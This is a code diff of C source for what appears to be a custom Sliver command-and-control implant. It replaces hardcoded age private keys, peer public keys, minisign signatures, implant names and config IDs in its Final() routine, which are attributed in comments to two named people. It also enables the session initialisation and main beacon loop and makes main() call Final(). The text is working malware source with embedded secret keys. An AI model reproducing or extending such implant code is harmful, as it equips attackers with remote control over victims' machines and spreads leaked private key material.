@@ -1986,7 +1986,8 @@ VOID Final(VOID)
 	DWORD dwMaxFailure = 5;
 	DWORD dwReconnectInterval = 600;
 #elif _SESSION
-	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
+	// From Tu Dinh
+	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
 	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
 	CHAR szPeerPubKey[] = "age1p6yn2nngy5up5mwy9cl98k9g3v4e80j7vuca20046nr2cny6n46q0yu0dr";
 	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1EHFACCLHSDQK02CTA7DWEA7ZH3A7S67Z4VD26YDWZW2RFSJN947SRKP6FG";
@@ -1995,13 +1996,37 @@ VOID Final(VOID)
 	CHAR szSliverClientName[] = "LUCKY_BRASSIERE";
 	CHAR szConfigId[] = "2fcc56b8-fbf9-4c3f-99be-d7ba7f2ab289";
 	DWORD dwMaxFailure = 5;
+	DWORD dwReconnectInterval = 600;*/
+
+	// From Phan Chu Trinh
+	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
+	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
+	CHAR szPeerPubKey[] = "age1rxdeq6u2wnyxwfan9ll7ggdss8dhhw7rkryxvfclckrpyh55kp4qajppgy";
+	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-17ENF9KR5YJ5D26DP8J2MSJGYJPPTSTSK2DNXU9HT9JDLDUEX0UAQ9A8XU4";
+	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
+	UINT64 uEncoderNonce = 13;
+	CHAR szSliverClientName[] = "LUCKY_BRASSIERE";
+	CHAR szConfigId[] = "5cd83e7f-3958-491d-ae5e-fdfa2ee7800a";
+	DWORD dwMaxFailure = 5;
 	DWORD dwReconnectInterval = 600;
 #else
+	// From Tu Dinh
+	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
 	CHAR szPeerPubKey[] = "age1k7qh27zf9v4d3ystvlkdzaxlpn4fs5zgntxfzwraqj2gk6xl0e3ssdzhjy";
 	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1JEE7U0JL58FKMEXY3U5WP2KJ2V2Q8AJNG7TSL7HN8KH0Y8HWASJQ2HVZ6S";
 	CHAR szRecipientPubKey[] = "age1urmls5nq4m8px0u5gscz7wyf04j8qk7mr8tcm5tn9fxym4p8l5wqwuzjjh";
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
-	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: \nRWTPhXK7/jqk+aZEopilp1prxuEKzrnfgQR3yxMHsCVAsLe+VAMy7OmKpgePtSriqTmwOMdhkTy0pFpJgwIChwCP0BnNS0DG0gI=\ntrusted comment: 1729822855\n0yadVaLH3tNnDhUQLVkkd8oZwIG48QH8YmH2a+HXiYAvvoA4slwQFP+35kphcOuh4+8ZzZS1o8nwp+mQg7jWDw==";
+	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: \nRWTPhXK7/jqk+aZEopilp1prxuEKzrnfgQR3yxMHsCVAsLe+VAMy7OmKpgePtSriqTmwOMdhkTy0pFpJgwIChwCP0BnNS0DG0gI=\ntrusted comment: 1729822855\n0yadVaLH3tNnDhUQLVkkd8oZwIG48QH8YmH2a+HXiYAvvoA4slwQFP+35kphcOuh4+8ZzZS1o8nwp+mQg7jWDw==";*/
+
+	// From Phan Chu Trinh
+	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
+	CHAR szPeerPubKey[] = "age16aedv4nundhlv927c8meu8k9vrcf224sr090k7999420ps07zyas6nlr9d";
+	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-15YWPM5V3JPGXACM8UGKNYDK09405YFFFXQ7HNA6S9S2V5FMGL20Q6EXCAD";
+	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
+	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
+	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+cotPaO2HUlHxdPIlJ4lDeGPTabempvacXTJTRYY/CCiTaxyFHfU9h6rZOnnGIPmpOC4O64uGYo8sm0rYf5Vcw8=\ntrusted comment: timestamp:1730078090\nl7oSil5yXvzaofhdUQ2crXv/rBhC3i7DtSmMJajaq4WletrhFq6TOj82pABO4gjoMGNIg9m3Rjq8/FJ0Cx3OBQ==";
+	CHAR szSliverClientName[] = "SLIPPERY_BALANCE";
+	CHAR szConfigId[] = "dada7b66-cad8-4d21-b038-4872f834109d";
 #endif
 
 #ifndef _DEBUG
@@ -2016,11 +2041,11 @@ VOID Final(VOID)
 	pGlobalConfig->lpRecipientPubKey = DuplicateStrA(szRecipientPubKey, 0);
 	pGlobalConfig->lpPeerPubKey = DuplicateStrA(szPeerPubKey, 0);
 	pGlobalConfig->lpPeerPrivKey = DuplicateStrA(szPeerPrivKey, 0);
+	pGlobalConfig->lpConfigID = DuplicateStrA(szConfigId, 0);
 	pGlobalConfig->lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
 	pGlobalConfig->lpPeerAgePublicKeySignature = DuplicateStrA(szPeerAgePublicKeySignature, 0);
-	/*pGlobalConfig->uEncoderNonce = uEncoderNonce;
 	lstrcpyA(pGlobalConfig->szSliverName, szSliverClientName);
-	lstrcpyA(pGlobalConfig->szConfigID, szConfigId);
+	/*pGlobalConfig->uEncoderNonce = uEncoderNonce;
 	pGlobalConfig->dwMaxFailure = dwMaxFailure;
 	pGlobalConfig->dwReconnectInterval = dwReconnectInterval;*/
 	pGlobalConfig->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
@@ -2032,7 +2057,8 @@ VOID Final(VOID)
 	pSessionClient = SessionInit(pGlobalConfig);
 	SessionMainLoop(pSessionClient);
 #else
-
+	pSessionClient = SessionInit(pGlobalConfig);
+	SessionMainLoop(pSessionClient);
 #endif
 CLEANUP:
 	if (hThread != NULL) {
@@ -2199,9 +2225,9 @@ int main(void) {
 	//test118();
 	//test119();
 	//test120();
-	test121();
+	//test121();
 	//test122();
-	//Final();
+	Final();
 
 	return 0;
 }
